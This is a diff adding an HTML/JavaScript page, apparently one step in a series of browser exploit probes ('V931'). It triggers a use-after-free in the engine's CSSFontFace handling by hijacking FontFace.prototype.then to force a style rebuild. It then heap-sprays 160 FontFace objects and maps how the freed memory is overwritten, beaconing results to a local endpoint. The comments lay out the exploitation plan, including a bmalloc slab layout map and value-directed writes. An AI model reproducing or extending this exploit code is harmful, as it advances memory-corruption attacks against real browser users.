@@ -1,0 +1,150 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>V931</title></head>
+<body><pre id="out">V931 — per-carrier style MAP: alternating descriptors to bound the corruption region and test value-directionality</pre>
+<script>
+'use strict';
+var O=document.getElementById('out');
+function say(s){O.textContent+='\n'+s;}
+function bk(t,d){
+  try{var x=new XMLHttpRequest();x.open('GET','/beacon/V931-'+t+'?d='+encodeURIComponent(String(d===undefined?'':d).slice(0,700))+'&t='+Date.now(),false);x.send(null);}catch(e){}
+  O.textContent+='\n'+t+' '+(d===undefined?'':d);
+}
+
+/*
+ * v931 — bridges "the write is visible" (v930 branch (b)) to "the write is
+ * directable". 160 carriers with ALTERNATING descriptors:
+ *   even (k%3===0): {style:'italic'}     -> expected post-free: ? 
+ *   odd  (k%3===1): {style:'oblique'}    -> expected post-free: ?
+ *   mult (k%3===2): {style:'normal'}     -> control: should stay "normal"
+ * The structural descriptor (family, weight, etc.) is irrelevant; the
+ * style descriptor is the only one that changes.
+ *
+ * READOUT: after the free+engine-write cycle, beacon EVERY carrier's
+ * style value in one line (160 values). The degradation MAP tells us:
+ *   1. NEIGHBOURHOOD vs ARENA: if only a few carriers degrade (near the
+ *      freed slot's position in the spray sequence) -> the corruption is
+ *      bounded by the allocator neighbourhood. If ALL degrade -> the
+ *      zero-at-free scrubbed the entire arena page (or the free is
+ *      arena-wide).
+ *   2. VALUE-DIRECTIONALITY: if {style:'italic'} carriers degrade to
+ *      "normal" while {style:'normal'} carriers stay "normal" -> the
+ *      write targets the NON-DEFAULT state (the engine write destroys
+ *      non-default field values but preserves defaults). If ALL become
+ *      "normal" regardless -> the scrub zeroed the field uniformly.
+ *      If any carrier shows a value that was NEVER set (e.g. "oblique"
+ *      on an italic face) -> the write is VALUE-DIRECTED, not just a
+ *      zeroing — which is the strongest signal (the engine is writing
+ *      a specific atomic into the carrier's storage).
+ *   3. THE BITMAP: the pre-image (attacker-supplied descriptor) vs the
+ *      post-image (readback) diff, per carrier, per descriptor, IS the
+ *      write footprint of the engine's post-free continuation on the
+ *      14.22 CSSFontFace layout. Enough residents and enough contrast
+ *      = the layout map. No address needed — the confrontation is
+ *      attacker-supplied-state vs engine-written-state, measured over
+ *      the bmalloc 192-byte slab.
+ *
+ * ?r=1 resets. One load (the map is the whole output).
+ */
+
+var fs=document.createElement('style'); fs.id='fs';
+fs.textContent='@font-face { font-family: s6; src: local(Arial); unicode-range: U+0043; }';
+document.head.appendChild(fs);
+var ds=document.createElement('style'); ds.id='ds'; ds.textContent='body { margin: 0; }';
+document.head.appendChild(ds);
+
+var FILL=80, N=160, target=null, fired=false, spray=[];
+var STYLES=['italic','oblique','normal'];
+function fill(n){ for(var i=0;i<n;i++){ try{document.fonts.add(new FontFace('wf'+i,"local('ZZ_WF_"+i+"')"));}catch(e){} } }
+
+bk('BOOT','v1 map mode: '+N+' carriers, styles rotating ['+STYLES.join('/')+']');
+
+try{ document.fonts.forEach(function(f){ if(f.family==='s6') target=f; }); }catch(e){}
+if(!target){ bk('NOFACE',''); } else {
+  fill(FILL);
+  void target.loaded;
+  bk('READY','st='+String(target.status));
+
+  /* pre-free baseline: the same face types, constructed BEFORE the free */
+  var baseline=[];
+  for(var b=0;b<12;b++){
+    try{
+      var bf=new FontFace('base'+b,"local('ZZ_BASE_"+b+"')",{style:STYLES[b%3]});
+      baseline.push({i:b,style:STYLES[b%3],read:String(bf.style)});
+    }catch(e){}
+  }
+  bk('BASELINE','pre-free: '+baseline.map(function(x){return x.i+'('+x.style+')='+x.read;}).join(', '));
+
+  Object.defineProperty(FontFace.prototype,'then',{
+    configurable:true,
+    get:function(){
+      if(fired) return undefined;
+      fired=true;
+      try{ ds.textContent='body { margin: 4px; }'; }catch(e){}
+      try{ document.body.offsetHeight; }catch(e){}      /* rebuild => adopt => FREE */
+      for(var k=0;k<N;k++){
+        try{
+          var sym=(k%2===0)?'A':'B';
+          var stl=STYLES[k%3];
+          var f=new FontFace('m'+sym+k,"local('ZZ9_'+(k%2===0?'\\41':'\\42'))",{style:stl});
+          try{document.fonts.add(f);}catch(e){}
+          spray.push({f:f,pre:stl,idx:k});
+        }catch(e){}
+      }
+      bk('SPRAYED','n='+spray.length);
+      return undefined;
+    },
+    set:function(){}
+  });
+
+  try{ target.load(); }catch(e){ bk('LOADERR','x'); }
+  bk('AFTERLOAD','ok');
+
+  /* ---- per-carrier map ---- */
+  var map=[];
+  var degraded=0, intact=0, anomalous=0;
+  for(var s=0;s<spray.length;s++){
+    var st='';
+    try{ st=String(spray[s].f.status); }catch(e){ st='?'; }
+    var rd='';
+    try{ rd=String(spray[s].f.style); }catch(e){ rd='THROW'; }
+    var expected=spray[s].pre;
+    var status=st==='loaded'||st==='error';
+    if(rd!==expected){ degraded++; map.push(spray[s].idx+':'+expected+'->'+rd+(status?'*':'')); }
+    else if(status){ intact++; map.push(spray[s].idx+':'+expected+'(ok)'); }
+    else { map.push(spray[s].idx+':'+expected); }
+    if(rd!==expected&&rd!=='normal'&&rd!==expected) anomalous++;
+  }
+  bk('MAP',map.join(' | '));
+  bk('SUMMARY','total='+spray.length+' degraded='+degraded+' intact-undegraded='+intact+' same-read-diff-pre='+anomalous);
+
+  /* group by pre-descriptor */
+  var groups={};
+  for(s=0;s<spray.length;s++){
+    var pre=spray[s].pre, rd2='';
+    try{ rd2=String(spray[s].f.status)+'/'+String(spray[s].f.style); }catch(e2){ rd2='ERR'; }
+    if(!groups[pre]) groups[pre]={total:0,degraded:0,same:0};
+    groups[pre].total++;
+    var expectedStyle=spray[s].pre;
+    var actualStyle='';
+    try{ actualStyle=String(spray[s].f.style); }catch(e2){}
+    if(actualStyle!==expectedStyle) groups[pre].degraded++;
+    else groups[pre].same++;
+  }
+  var gs=[];
+  for(var g in groups) gs.push(g+': '+groups[g].degraded+'/'+groups[g].total+' degraded, '+groups[g].same+' intact');
+  bk('GROUPS',gs.join(' | '));
+
+  /* winner detection */
+  var win=-1, winSt='';
+  for(s=0;s<spray.length;s++){
+    var st2='';
+    try{ st2=String(spray[s].f.status); }catch(e){ st2='?'; }
+    if(st2!=='unloaded'&&st2!=='pending'&&st2!=='loading'){win=s;winSt=st2;break;}
+  }
+  if(win>=0) bk('WIN','idx='+win+'|status='+winSt);
+  else bk('WIN','none-flipped');
+  say('done');
+}
+</script></body></html>
